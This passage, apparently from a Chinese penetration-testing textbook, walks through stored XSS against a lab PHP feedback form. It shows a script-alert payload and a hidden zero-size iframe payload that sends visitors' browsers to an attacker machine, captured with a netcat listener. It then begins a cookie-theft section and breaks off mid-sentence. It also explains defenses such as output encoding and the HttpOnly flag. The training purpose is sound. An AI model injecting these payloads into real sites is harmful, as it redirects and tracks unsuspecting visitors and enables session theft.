
用于此目的最常见的特殊字符包括：

```
< > ' " { } ;
```

*列表 285 - HTML 和 JavaScript 中的特殊字符*

让我们描述一下这些特殊字符的用途。HTML 使用“<”和“>”来表示元素^262，即构成 HTML 文档的各个组件。JavaScript 在函数声明中使用“（”和“）”。单引号（'）和双引号（"）用于表示字符串，而分号（;）用于标记语句的结尾。

如果应用程序没有移除或编码这些字符，它可能会易受 XSS 攻击，因为这些字符可用于向页面中引入代码。

> 虽然存在多种编码类型，但在 Web 应用程序中我们最常遇到的是 HTML 编码^263 和 URL 编码。^264 URL 编码有时也称为百分号编码，用于将 URL 中的非 ASCII 字符进行转换，例如将空格转换为“%20”。

> HTML 编码（或字符引用）可用于显示通常具有特殊含义的字符，如标签元素。例如，&lt; 是“<”的字符引用。遇到这种编码时，浏览器不会将该字符解释为元素的开始，而是原样显示实际字符。

如果我们能够将这些特殊字符注入到页面中，浏览器会将它们视为代码元素。然后，我们就可以开始构建将在受害者浏览器中执行的代码。

根据我们的输入被包含的位置不同，我们可能需要不同的字符集。例如，如果我们的输入被添加到 div 标签之间，我们需要包含自己的 script 标签^265，并且需要能够作为有效负载的一部分注入“<”和“>”。如果我们的输入被添加到现有的 JavaScript 标签内部，我们可能只需要引号和分号来添加我们自己的代码。

### 9.4.2.2 基础 XSS

让我们通过针对我们的 Windows 10 实验机器的一次简单攻击来演示基础 XSS。

回到运行在我们 Windows 10 实验机器 80 端口上的 Web 应用程序，我们将像之前一样通过 XAMPP 启动 Apache 和 MySQL，然后浏览主 Web 页面：

![](img/ec25e59d75726b7041242a56d3376832_300_0.png)

*图 143：墨西哥夹饼。美味的墨西哥夹饼。*

该应用程序包含几个漏洞，包括一个存储型 XSS 漏洞。为了演示这一点，我们可以在反馈表单字段中插入几个特殊字符并提交。我们将首先提交一些 *JavaScript* 特有的字符：双引号（*），分号（;），`<` 和 `>`。

![](img/ec25e59d75726b7041242a56d3376832_300_1.png)

*图 144：测试 XSS*

在检查器工具中审查生成的消息，我们可以看到我们的字符未被移除或编码：

![](img/ec25e59d75726b7041242a56d3376832_301_0.png)

由于输入没有被过滤或消毒，且我们的特殊字符已传递到输出中，存在 XSS 漏洞的条件似乎已经具备。让我们检查源代码以更好地理解正在发生的事情。

当反馈提交到站点时，由以下代码处理：

```php
36  <?php
37  include "database.php";
38  $sql = "INSERT INTO feedback(name, text) VALUES (?,?)";
39  $stmt = $conn->prepare($sql);
40  $stmt->bind_param("ss", $_POST['name'], $_POST['comment']);
41  $stmt->execute();
42  ?>
```

列表 286 中的第 40 行处理提交到服务器的 "name" 和 "comment" 字段的值。代码将这些值未经任何修改直接插入到数据库中。

接下来，我们将检查在站点上显示反馈的代码：

```php
38 <?php
39 include "database.php";
40 $sql = "SELECT name, text FROM feedback";
41 $result = $conn->query($sql);
42 if ($result->num_rows > 0) {
43 while($row = $result->fetch_assoc()) {
44 echo "<tr><td> " . $row["name"]. "</td><td>" . $row["text"]. "</td></tr>";
45 }
46 } else { echo "No results :{"; }
47 
48 ?>
```

*列表 287 - feedback.php 的代码摘录*

列表 287 中的第 44 行将数据库的结果写入页面。结果确实未经任何修改就被输出。

> 应该在何处对数据进行消毒？是在提交时还是在显示时？理想情况下，数据应在两处都进行消毒。在两处都进行消毒是“纵深防御”^266的一个例子，这是一种主张尽可能添加防御层的安全实践和原则。这往往能创建更健固的应用程序。然而，如果只在其中一处应用消毒，则应保持一致性。在 PHP 中，可以使用 htmlspecialchars^267 函数在显示字符串之前将关键字符转换为 HTML 实体。在我们查看的两个 PHP 文件中的任何一个中使用此函数都有助于防止此 XSS 漏洞。

^266 (Wikipedia, 2019). https://en.wikipedia.org/wiki/Defense_in_depth_(computing)

^267 (The PHP Group, 2019). https://php.net/manual/en/function.htmlspecialchars.php

让我们更新输入并创建一个显示简单 *Javascript* `alert` 的有效负载。根据我们审查的代码，我们可以看到我们的消息被插入到 HTML 表格单元格中。这里不需要任何花哨的编码技巧，只需要像 `"<script>alert('XSS')</script>"` 这样基本 XSS 有效负载即可。让我们现在插入它。

![](img/ec25e59d75726b7041242a56d3376832_303_0.png)

提交我们的有效负载后，刷新反馈页面应该执行我们注入的 JavaScript：

![](img/ec25e59d75726b7041242a56d3376832_304_0.png)

很好。我们将跨站脚本有效负载注入了 Web 应用程序的数据库中，它将提供给任何查看该站点的人。简单的 alert 窗口是跨站脚本所能实现的功能中相当琐碎的例子，所以让我们尝试一些更有趣的内容。

### 9.4.2.3 内容注入

XSS 漏洞通常用于投递客户端攻击，因为它们允许将受害者的浏览器重定向到攻击者选择的位置。重定向的一种隐蔽替代方法是将不可见的 iframe^268 注入到我们的 XSS 有效负载中，如下所示：

```html
<iframe src=http://10.11.0.4/report height="0" width="0"></iframe>
```

*列表 288 - 使用 iframe 投递 XSS 有效负载*

iframe 用于在当前 HTML 文档中嵌入另一个文件，例如图像或另一个 HTML 文件。在我们的情况下，“report” 是链接在我们攻击机器上的一个文件，由于高度和宽度被设置为零，所以该 iframe 是不可见的。

一旦提交了此有效负载，访问该页面的任何用户都将连接回我们的攻击机器。为了测试这一点，我们可以在攻击机器（本例中为 10.11.0.4）的 80 端口上创建一个 Netcat 监听器，然后刷新反馈页面。

```bash
kali@kali:~$ sudo nc -nvlp 80
[sudo] password for kali:
listening on [any] 80 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 41612
GET /report HTTP/1.1
Host: 10.11.0.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.0.22/feedback.php
...
```

^268 (Mozilla, 2019). https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe

![](img/ec25e59d75726b7041242a56d3376832_305_0.png)

如上所述，浏览器重定向起作用了，通过 iframe 将受害者浏览器发送到了我们的攻击机器。同样，受害者不会在浏览器中看到零大小的 iframe。

我们可以走得更远，将受害者浏览器重定向到客户端攻击或信息收集脚本。

为了做到这一点，我们首先需要捕获受害者的 User-Agent 头，以帮助识别他们正在使用的浏览器类型。在上面的例子中，我们使用 Netcat，因为它向我们显示浏览器发送的完整请求，包括 User-Agent 头。Apache HTTP Server 默认也会在 `/var/log/apache2/access.log` 中捕获 User-Agent 头。

我们不会在这里执行任何客户端攻击。相反，我们将尝试以管理用户身份访问该 Web 应用程序。

### 9.4.2.4 窃取 Cookie 和会话信息

如果应用程序使用不安全的会话管理配置，我们还可以使用 XSS 来窃取 cookie[^269] 和会话信息。如果我们能窃取经过身份验证的用户的 cookie，我们就可以在目标网站内冒充该用户。

为了提供一些背景知识，网站使用 cookie 来跟踪状态[^270]和用户信息。Cookie 可以设置多个可选标志，其中有两个对渗透测试者特别感兴趣：`Secure` 和 `HttpOnly`。

`Secure`[^271] 标志指示浏览器仅通过加密连接（如 HTTPS）发送 cookie。这保护了 cookie 以免以明文形式发送并在网络上被捕获。

`HttpOnly`[^272] 标志指示浏览器拒绝 JavaScript 访问该 cookie。如果未设置此标志，我们可以使用 XSS 有效负载来窃取 cookie。

然而，即使未设置此标志，我们也必须绕过一些其他的浏览器控制，因为浏览器安全规定由一个域设置的 cookie 不能直接发送到另一个域。顺便一提，通过 `Set-Cookie` 指令中的 `Domain` 和 `Path` 标志，这可以放宽为子域名。作为变通方法，如果 JavaScript 可以访问 cookie 值，我们可以将其用作链接的一部分，并发送该链接，我们可以分解该链接以检索 cookie 值。

让我们尝试一个例子来演示这是如何工作的。我们的示例应用程序在管理员用户登录时会设置一个 `PHPSESSID` cookie。应用程序使用该 cookie 来确定用户是否

[^269] (Wikipedia, 2019), https://en.wikipedia.org/wiki/HTTP_cookie

[^270] (Wikipedia, 2019), https://en.wikipedia.org/wiki/Session_(computer_science)

[^271] (Wikipedia, 2019), https://en.wikipedia.org/wiki/Secure_cookie

[^272] (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies
